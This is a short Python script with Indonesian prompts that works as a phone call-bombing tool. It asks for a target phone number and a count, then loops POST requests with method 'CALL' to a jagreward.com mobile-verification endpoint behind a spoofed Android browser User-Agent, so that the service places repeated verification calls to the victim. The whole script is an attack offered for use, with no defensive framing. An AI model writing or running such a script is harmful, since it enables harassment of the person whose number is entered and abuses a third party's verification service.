import os,sys,time,requests
from time import sleep
print ("")
print ("Masukan Nomor")
print ("")
print ("Contoh nomor : 8xxx")
nomor = input("Nomor Target : ")
print ("MASUKAN JUMLAH ")
jumlah = int(input("Jumlah Spam : "))
print("Proses Call")
time.sleep(3)
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" Status Call Berhasil!")
